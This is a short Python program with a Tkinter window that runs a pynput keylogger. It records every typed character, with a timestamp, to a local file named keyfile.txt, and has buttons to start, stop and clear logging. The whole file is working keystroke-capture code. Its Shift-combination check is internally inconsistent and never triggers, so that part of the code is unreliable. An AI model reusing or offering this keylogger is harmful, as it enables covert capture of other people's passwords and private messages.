import tkinter as tk
from pynput import keyboard
from datetime import datetime

# Define a list to keep track of pressed keys
pressed_keys = set()
listener = None  # Global variable to store the keyboard listener

def KeyPressed(key):
    global pressed_keys
    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        char = key.char
    except AttributeError:
        char = None

    if char:
        # Add the pressed key to the set
        pressed_keys.add(char)
        with open("keyfile.txt", 'a') as logKey:
            logKey.write(f"{timestamp} - {char}\n")

    # Check for key combination (Shift + a)
    if any(k in pressed_keys for k in ['shift', 'shift_r']):
        if 'a' in pressed_keys and '2' in pressed_keys:
            with open("keyfile.txt", 'a') as logKey:
                logKey.write(f"{timestamp} - Shift + 2\n")

def KeyReleased(key):
    global pressed_keys
    try:
        char = key.char
    except AttributeError:
        char = None

    if char:
        # Remove the released key from the set
        pressed_keys.remove(char)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=KeyPressed, on_release=KeyReleased)
    listener.start()
    status_label.config(text="Running")

def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        status_label.config(text="Stopped")

def clear_log():
    with open("keyfile.txt", 'w') as logKey:
        logKey.write("")
    status_label.config(text="Log Cleared")

# Create the GUI
root = tk.Tk()
root.title("Keylogger GUI")

status_label = tk.Label(root, text="Stopped", width=20)
status_label.pack()

button_frame = tk.Frame(root)
button_frame.pack()

start_button = tk.Button(button_frame, text="Start Keylogger", command=start_keylogger)
start_button.pack(side=tk.LEFT)

stop_button = tk.Button(button_frame, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(side=tk.LEFT)

clear_button = tk.Button(root, text="Clear Log", command=clear_log)
clear_button.pack()

root.mainloop()
